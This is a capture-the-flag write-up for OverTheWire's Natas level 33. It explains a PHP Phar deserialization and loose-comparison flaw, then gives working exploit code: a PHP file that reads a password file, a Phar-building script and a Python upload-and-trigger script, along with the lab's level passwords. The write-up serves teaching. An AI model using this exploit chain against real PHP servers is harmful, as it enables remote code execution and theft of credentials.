# Natas Level 33

> Username: natas33

> Password: kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL

> URL: http://natas33.natas.labs.overthewire.org

## Solution

Entering the URL, we found that we can upload `firmware` in the form of PHP and have it executed, if we have the right file hash. So let's view the source code to see the vulnerabilities.

```php
<?php
// graz XeR, the first to solve it! thanks for the feedback!
// ~morla
class Executor{
	private $filename=""; 
	private $signature='adeafbadbabec0dedabada55ba55d00d';
	private $init=False;

	function __construct(){
		$this->filename=$_POST["filename"];
		if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
			echo "File is too big<br>";
		}
		else {
			if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
				echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
				echo "Firmware upgrad initialised.<br>";
			}
			else{
				echo "There was an error uploading the file, please try again!<br>";
			}
		}
	}

	function __destruct(){
		// upgrade firmware at the end of this script

		// "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
		chdir("/natas33/upload/");
		if(md5_file($this->filename) == $this->signature){
			echo "Congratulations! Running firmware update: $this->filename <br>";
			passthru("php " . $this->filename);
		}
		else{
			echo "Failur! MD5sum mismatch!<br>";
		}
	}
}
?>

<h1>natas33</h1>
<div id="content">
<h2>Can you get it right?</h2>

<?php
	session_start();
	if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {
		new Executor();
	}
?>
```

Reading the code we found three important vulnerabilities.

1/ User-controlled filename

```php
$this->filename = $_POST["filename"];
```

We control the filename used by `md5_file()`.

2/ Phar deserialization

```php
md5_file($this->filename)
```

PHP's Phar stream wrapper can deserialize Phar metadata when the archive is accessed through a `phar://` path.
This means a file operation can trigger PHP object deserialization even though the application never explicitly calls `unserialize()`.

3/ Loose comparison

```php
md5_file($this->filename) == $this->signature
```

PHP uses `==` rather than `===`. So if we can change `$signature` to Boolean `true`, a non-empty MD5 hash string will compare equal to it.
This gives us a way to bypass the MD5 verification.

So the attack would be like this:
1/ Create a Phar archive.
2/ Put a malicious `Executor` object in its metadata.
3/ Change its `$filename` to `shell.php`.
4/ Change its `$signature` to `true`.
5/ Trigger metadata deserialization through `md5_file()`.
6/ Let `__destruct()` execute our PHP file.

First let's create the malicious files.

```shell
nano shell.php
```

```php
<?php
echo "NATAS34_BEGIN";
echo file_get_contents('/etc/natas_webpass/natas34');
echo "NATAS34_END";
?>
```

```shell
nano create_phar.php
```

```php
<?php
class Executor {
    private $filename = "shell.php";
    private $signature = True;
    private $init = false;
}

$phar = new Phar("natas.phar");

$phar->startBuffering();

$phar->addFromString("test.txt", "test");

$phar->setStub(
    "<?php __HALT_COMPILER(); ?>"
);

$object = new Executor();

$phar->setMetadata($object);

$phar->stopBuffering();

echo "[+] Malicious Phar archive created!\n";
?>
```

```shell
php -d phar.readonly=0 create_phar.php
```

```shell
ls -l
```

```text
create_phar.php
shell.php
natas.phar
```

Now instead of sending the requests and upload the files manually, we can create a script to automate the exploit process.

```python
import requests
import re

URL = "http://natas33.natas.labs.overthewire.org/index.php"

USERNAME = "natas33"
PASSWORD = "kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL"

AUTH = (USERNAME, PASSWORD)


def upload(local_file, remote_filename):
    with open(local_file, "rb") as f:
        response = requests.post(
            URL,
            auth=AUTH,
            data={"filename": remote_filename},
            files={"uploadedfile": (local_file, f)}
        )

    print(f"[+] Uploaded {local_file}")
    return response


# Stage 1: Upload PHP payload
upload("shell.php", "shell.php")

# Stage 2: Upload malicious Phar archive
upload("natas.phar", "natas.phar")

# Stage 3: Trigger Phar deserialization
print("[+] Triggering Phar deserialization...")

response = upload(
    "shell.php",
    "phar://natas.phar/test.txt"
)

# Extract only the password between our markers
match = re.search(
    r"NATAS34_BEGIN(.*?)NATAS34_END",
    response.text,
    re.DOTALL
)

if match:
    password = match.group(1).strip()

    print("\n" + "=" * 45)
    print("[+] Natas34 password:", password)
    print("=" * 45)

else:
    print("\n[-] Password not found!")
    print("[-] Check the server response:")
    print(response.text)
```

```text
[+] Uploaded shell.php
[+] Uploaded natas.phar
[+] Triggering Phar deserialization...
[+] Uploaded shell.php

=============================================
[+] Natas34 password: cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK
=============================================
```

```text
cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK
```

